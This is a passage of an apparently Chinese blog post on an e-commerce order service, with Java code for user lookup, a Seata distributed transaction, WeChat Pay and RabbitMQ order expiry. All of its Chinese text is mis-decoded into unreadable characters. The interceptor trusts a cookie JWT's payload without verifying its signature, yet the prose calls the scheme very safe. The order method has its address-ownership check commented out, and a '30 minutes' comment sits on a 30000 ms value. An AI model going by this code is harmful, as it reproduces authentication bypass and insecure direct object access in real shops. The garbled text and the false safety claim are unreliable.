<h2 id="è®¢å•æœåŠ¡è·å–ç™»é™†ç”¨æˆ·ä¿¡æ¯å®ç°"><a href="#è®¢å•æœåŠ¡è·å–ç™»é™†ç”¨æˆ·ä¿¡æ¯å®ç°" class="headerlink" title="è®¢å•æœåŠ¡è·å–ç™»é™†ç”¨æˆ·ä¿¡æ¯å®ç°"></a>è®¢å•æœåŠ¡è·å–ç™»é™†ç”¨æˆ·ä¿¡æ¯å®ç°</h2><p>æœ¬é¡¹ç›®é‡‡ç”¨ç³»ç»Ÿè®¾è®¡çš„æ–¹æ¡ˆäºŒï¼šè‡ªå·±ä»cookieçš„tokenä¸­è§£æç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ç§æ–¹æ¡ˆå¾ˆå®‰å…¨ã€‚</p>
<p>ThreadLocalè®©ç”¨æˆ·ä¸æ¯ä¸€ä¸ªè¯·æ±‚çº¿ç¨‹ç»‘å®šï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120508.png" alt="image-20210704030245597"></p>
<p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-08 9:52 ä¸Šåˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserHolder</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;Long&gt; tl = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setUser</span><span class="params">(Long id)</span>&#123;</span><br><span class="line">        tl.set(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Long <span class="title function_">getUser</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Long</span> <span class="variable">id</span> <span class="operator">=</span> tl.get();</span><br><span class="line">        <span class="keyword">if</span>(id == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">removeUser</span><span class="params">()</span>&#123;</span><br><span class="line">        tl.remove();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mvcæ‹¦æˆªå™¨</span></span><br><span class="line"><span class="keyword">package</span> com.leyou.trade.interceptors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.BaseTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exception.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.CookieUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.utils.UserHolder;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-08 9:58 ä¸Šåˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="comment">// è·å–cookieä¸­çš„token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, BaseTokenConstants.COOKIE_NAME);</span><br><span class="line">        <span class="comment">// è·å–tokenä¸­çš„ç”¨æˆ·, ä¸éœ€è¦å…¬é’¥æˆ–ç§é’¥ï¼Œç›´æ¥è§£æè½½è·</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Payload&lt;UserInfo&gt; payload = JwtUtils.getInfoFromToken(token, UserInfo.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä¿å­˜ç”¨æˆ·</span></span><br><span class="line">            UserHolder.setUser(userInfo.getId());</span><br><span class="line">            <span class="comment">// æ”¾è¡Œ</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            <span class="comment">// è·å–ç”¨æˆ·å¤±è´¥ï¼Œæ— éœ€å‘åèµ°äº†</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;è§£æç”¨æˆ·ä¿¡æ¯å¤±è´¥ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> &#123;</span><br><span class="line">        <span class="comment">// ä¸šåŠ¡ç»“æŸåï¼Œç§»é™¤ThreadLocalä¸­çš„ç”¨æˆ·</span></span><br><span class="line">        UserHolder.removeUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="åˆ†å¸ƒå¼äº‹åŠ¡å®ç°"><a href="#åˆ†å¸ƒå¼äº‹åŠ¡å®ç°" class="headerlink" title="åˆ†å¸ƒå¼äº‹åŠ¡å®ç°"></a>åˆ†å¸ƒå¼äº‹åŠ¡å®ç°</h2><p>é‡‡ç”¨Seataè§£å†³æ–¹æ¡ˆï¼Œå¼€å¯ä¸€ä¸ªseataæœåŠ¡ï¼Œå°†ä¸¤ä¸ªé…ç½®æ–‡ä»¶æ”¾åˆ°resourceç›®å½•ä¸‹</p>
<p>å¼•å…¥seataä¾èµ–ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-alibaba-seata<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.seata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨åˆ†å¸ƒå¼äº‹åŠ¡å¼€å¯çš„æ–¹æ³•ä¸Šä½¿ç”¨Globaltransactionæ³¨è§£ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="meta">@GlobalTransactional</span></span><br><span class="line">   <span class="keyword">public</span> Long <span class="title function_">createOrder</span><span class="params">(OrderFormDTO orderFormDTO)</span> &#123;</span><br><span class="line">       <span class="comment">// 1.è®¢å•</span></span><br><span class="line">       <span class="type">Order</span> <span class="variable">order</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Order</span>();</span><br><span class="line">       <span class="comment">// 1.1.è®¢å•é‡‘é¢ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼šå•†å“æ€»é‡‘é¢ã€å®ä»˜é‡‘é¢ã€é‚®è´¹</span></span><br><span class="line">       Map&lt;Long, Integer&gt; carts = orderFormDTO.getCarts();</span><br><span class="line">       <span class="comment">// a.è·å–skuçš„idé›†åˆ</span></span><br><span class="line">       Set&lt;Long&gt; ids = carts.keySet();</span><br><span class="line">       <span class="comment">// b.æ ¹æ®skuçš„idæŸ¥è¯¢sku</span></span><br><span class="line">       List&lt;SkuDTO&gt; skuList = itemClient.querySkuByIds(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(ids));</span><br><span class="line">       <span class="comment">// c.è®¡ç®—æ€»é‡‘é¢</span></span><br><span class="line">       <span class="type">long</span> <span class="variable">total</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">       <span class="keyword">for</span> (SkuDTO sku : skuList) &#123;</span><br><span class="line">           <span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> carts.get(sku.getId());</span><br><span class="line">           total += sku.getPrice() * num;</span><br><span class="line">       &#125;</span><br><span class="line">       order.setTotalFee(total);</span><br><span class="line">       order.setPostFee(<span class="number">0L</span>);</span><br><span class="line">       order.setActualFee(order.getTotalFee() + order.getPostFee()<span class="comment">/*TODO å‡å»ä¼˜æƒ é‡‘é¢*/</span>);</span><br><span class="line">       order.setPaymentType(orderFormDTO.getPaymentType());</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 1.2.ç”¨æˆ·</span></span><br><span class="line">       <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser();</span><br><span class="line">       order.setUserId(userId);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 1.3.çŠ¶æ€</span></span><br><span class="line">       order.setStatus(OrderStatus.INIT);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 1.4.å†™å…¥æ•°æ®åº“</span></span><br><span class="line">       <span class="type">boolean</span> <span class="variable">isSuccess</span> <span class="operator">=</span> save(order);</span><br><span class="line">       <span class="keyword">if</span> (!isSuccess) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;æ–°å¢è®¢å•å¤±è´¥ï¼&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">Long</span> <span class="variable">orderId</span> <span class="operator">=</span> order.getOrderId();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 2.è®¢å•è¯¦æƒ…</span></span><br><span class="line">       List&lt;OrderDetail&gt; orderDetails = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(skuList.size());</span><br><span class="line">       <span class="comment">// 2.1.æŠŠskué›†åˆå°è£…æˆOrderDetailé›†åˆ</span></span><br><span class="line">       <span class="keyword">for</span> (SkuDTO sku : skuList) &#123;</span><br><span class="line">           <span class="type">OrderDetail</span> <span class="variable">detail</span> <span class="operator">=</span> buildOrderDetailFromSku(sku, orderId, carts.get(sku.getId()));</span><br><span class="line">           orderDetails.add(detail);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 2.2.å†™å…¥æ•°æ®åº“</span></span><br><span class="line">       detailService.saveBatch(orderDetails);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 3.ç‰©æµ</span></span><br><span class="line">       <span class="comment">// 3.1.è·å–åœ°å€çš„id</span></span><br><span class="line">       <span class="type">Long</span> <span class="variable">addressId</span> <span class="operator">=</span> orderFormDTO.getAddressId();</span><br><span class="line">       <span class="comment">// 3.2.æ ¹æ®idæŸ¥è¯¢åœ°å€</span></span><br><span class="line">       <span class="type">AddressDTO</span> <span class="variable">address</span> <span class="operator">=</span> userClient.queryAddressById(addressId);</span><br><span class="line">       <span class="comment">// åˆ¤æ–­å½“å‰åœ°å€æ˜¯å¦å±äºå½“å‰ç”¨æˆ·</span></span><br><span class="line">      <span class="comment">/* if(!Objects.equals(address.getUserId(), userId))&#123;</span></span><br><span class="line"><span class="comment">           // åœ°å€ä¸å±äºå½“å‰ç”¨æˆ·ï¼Œæ•°æ®æœ‰è¯¯</span></span><br><span class="line"><span class="comment">           throw new LyException(400, &quot;è¯·ä¸è¦çæï¼Œæ”¶è´§åœ°å€ä¸æ˜¯ä½ çš„ï¼&quot;);</span></span><br><span class="line"><span class="comment">       &#125;*/</span></span><br><span class="line">       <span class="comment">// 3.3.å°è£…OrderLogisticsï¼Œä»addressä¸­æ‹·è´å±æ€§åˆ°OrderLogistics</span></span><br><span class="line">       <span class="type">OrderLogistics</span> <span class="variable">orderLogistics</span> <span class="operator">=</span> address.toEntity(OrderLogistics.class);</span><br><span class="line">       orderLogistics.setOrderId(orderId);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 3.4.å†™å…¥æ•°æ®åº“</span></span><br><span class="line">       isSuccess = logisticsService.save(orderLogistics);</span><br><span class="line">       <span class="keyword">if</span> (!isSuccess) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;æ–°å¢è®¢å•å¤±è´¥ï¼&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 4.å‡åº“å­˜</span></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           itemClient.deductStock(carts);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (FeignException e) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(e.status(), e.contentUTF8());</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 5.å‘é€å»¶è¿Ÿæ¶ˆæ¯åˆ°äº¤æ¢æœº</span></span><br><span class="line">       amqpTemplate.convertAndSend(ORDER_EXCHANGE_NAME, EVICT_ORDER_KEY, orderId);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> orderId;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h2 id="å¾®ä¿¡æ”¯ä»˜å®ç°"><a href="#å¾®ä¿¡æ”¯ä»˜å®ç°" class="headerlink" title="å¾®ä¿¡æ”¯ä»˜å®ç°"></a>å¾®ä¿¡æ”¯ä»˜å®ç°</h2><p>éƒ¨åˆ†ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.github.wxpay.sdk.WXPay;</span><br><span class="line"><span class="keyword">import</span> com.github.wxpay.sdk.WXPayConfigImpl;</span><br><span class="line"><span class="keyword">import</span> com.github.wxpay.sdk.WXPayConstants;</span><br><span class="line"><span class="keyword">import</span> com.github.wxpay.sdk.WXPayUtil;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.trade.constants.PayConstants.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PayHelper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WXPay wxPay;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WXPayConfigImpl payConfig;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PayHelper</span><span class="params">(WXPay wxPay, WXPayConfigImpl payConfig)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.wxPay = wxPay;</span><br><span class="line">        <span class="built_in">this</span>.payConfig = payConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">unifiedOrder</span><span class="params">(Long orderId, Long totalFee)</span>&#123;</span><br><span class="line">        <span class="comment">// 1.å‡†å¤‡è¯·æ±‚å‚æ•°ï¼š</span></span><br><span class="line">        Map&lt;String, String&gt; data = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        <span class="comment">// å•†å“æè¿°</span></span><br><span class="line">        data.put(<span class="string">&quot;body&quot;</span>, ORDER_DESC);</span><br><span class="line">        <span class="comment">// å•†å®¶çš„è®¢å•ç¼–å·</span></span><br><span class="line">        data.put(ORDER_NO_KEY, orderId.toString());</span><br><span class="line">        <span class="comment">// æ”¯ä»˜æ€»é‡‘é¢ï¼Œå•ä½æ˜¯åˆ†</span></span><br><span class="line">        data.put(TOTAL_FEE_KEY, totalFee.toString());</span><br><span class="line">        <span class="comment">// ç»ˆç«¯IPï¼šå½“å‰è¯·æ±‚å‘èµ·è€…çš„IP</span></span><br><span class="line">        data.put(<span class="string">&quot;spbill_create_ip&quot;</span>, payConfig.getSpbillCreateIp());</span><br><span class="line">        <span class="comment">// æ­¤å¤„æŒ‡å®šä¸ºæ‰«ç æ”¯ä»˜</span></span><br><span class="line">        data.put(<span class="string">&quot;trade_type&quot;</span>, UNIFIED_ORDER_TRADE_TYPE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 2.ä¸‹å•ï¼Œå¾—åˆ°ç»“æœ</span></span><br><span class="line">            Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.éªŒè¯ç­¾å</span></span><br><span class="line">            isSignatureValid(resp);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4.æ ¡éªŒreturn_code</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;FAIL&quot;</span>.equals(resp.get(<span class="string">&quot;return_code&quot;</span>)))&#123;</span><br><span class="line">                <span class="comment">// ä¸šåŠ¡å¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;ä¸šåŠ¡æ‰§è¡Œå¤±è´¥ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 5.æ ¡éªŒresult_code</span></span><br><span class="line">            isResultSuccess(resp);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 6.è·å–æ”¯ä»˜é“¾æ¥</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> resp.get(PAY_URL_KEY);</span><br><span class="line">            <span class="keyword">if</span>(StringUtils.isBlank(url))&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;æ”¯ä»˜é“¾æ¥ä¸ºç©ºï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> url;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;ç»Ÿä¸€ä¸‹å•å¤±è´¥! &quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">isResultSuccess</span><span class="params">(Map&lt;String, String&gt; resp)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;FAIL&quot;</span>.equals(resp.get(<span class="string">&quot;result_code&quot;</span>)))&#123;</span><br><span class="line">            <span class="comment">// ä¸šåŠ¡å¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;ä¸šåŠ¡æ‰§è¡Œå¤±è´¥ï¼&quot;</span> + resp.get(<span class="string">&quot;err_code_des&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">isSignatureValid</span><span class="params">(Map&lt;String, String&gt; data)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isValid</span> <span class="operator">=</span> WXPayUtil.isSignatureValid(data, payConfig.getKey(), WXPayConstants.SignType.HMACSHA256);</span><br><span class="line">            <span class="keyword">if</span>(!isValid)&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;ç­¾åæ— æ•ˆ&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;ç­¾åé”™è¯¯ï¼Œæ— æ•ˆæ•°æ®ï¼&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="è®¢å•æ¸…ç†å®ç°"><a href="#è®¢å•æ¸…ç†å®ç°" class="headerlink" title="è®¢å•æ¸…ç†å®ç°"></a>è®¢å•æ¸…ç†å®ç°</h2><p>é…ç½®é˜Ÿåˆ—å’Œäº¤æ¢æœºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.ExchangeConstants.DEAD_EXCHANGE_NAME;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.ExchangeConstants.ORDER_EXCHANGE_NAME;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.QueueConstants.DEAD_ORDER_QUEUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.QueueConstants.EVICT_ORDER_QUEUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.RoutingKeyConstants.EVICT_ORDER_KEY;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-13 11:19 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MqConfig</span> &#123;</span><br><span class="line">    <span class="comment">// 30åˆ†é’Ÿ</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">ORDER_QUEUE_DELAY_TIME</span> <span class="operator">=</span> <span class="number">30000</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ly-order-exchange æ™®é€šä»»åŠ¡äº¤æ¢æœºï¼Œå°†æ¶ˆæ¯è½¬å‘åˆ°æ­»ä¿¡é˜Ÿåˆ—</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> TopicExchange <span class="title function_">orderExchange</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TopicExchange</span>(ORDER_EXCHANGE_NAME, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ly-dead-exchange æ­»ä¿¡äº¤æ¢æœºï¼Œæ¥æ”¶æ­»ä¿¡é˜Ÿåˆ—è½¬è¿‡æ¥çš„æ¶ˆæ¯ï¼Œå¹¶æŠ•é€’ç»™ä»»åŠ¡é˜Ÿåˆ—</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> TopicExchange <span class="title function_">deadExchange</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TopicExchange</span>(DEAD_EXCHANGE_NAME, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">deadOrderQueue</span><span class="params">()</span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; args = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// x-message-ttl å£°æ˜é˜Ÿåˆ—TTLå€¼</span></span><br><span class="line">        args.put(<span class="string">&quot;x-message-ttl&quot;</span>, ORDER_QUEUE_DELAY_TIME);</span><br><span class="line">        <span class="comment">// x-dead-letter-exchange å£°æ˜å½“å‰é˜Ÿåˆ—ç»‘å®šçš„æ­»ä¿¡äº¤æ¢æœº</span></span><br><span class="line">        args.put(<span class="string">&quot;x-dead-letter-exchange&quot;</span>, DEAD_EXCHANGE_NAME);</span><br><span class="line">        <span class="keyword">return</span> QueueBuilder.durable(DEAD_ORDER_QUEUE).withArguments(args).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">evictOrderQueue</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> QueueBuilder.durable(EVICT_ORDER_QUEUE).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å°†æ­»ä¿¡é˜Ÿåˆ—ä¸ly.order.exchangeäº¤æ¢æœºç»‘å®š</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindingDeadQueue</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(deadOrderQueue()).to(orderExchange()).with(EVICT_ORDER_KEY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŠŠæ­»ä¿¡äº¤æ¢æœºä¸ly.evict.order.queueç»‘å®š</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindingEvictQueue</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> 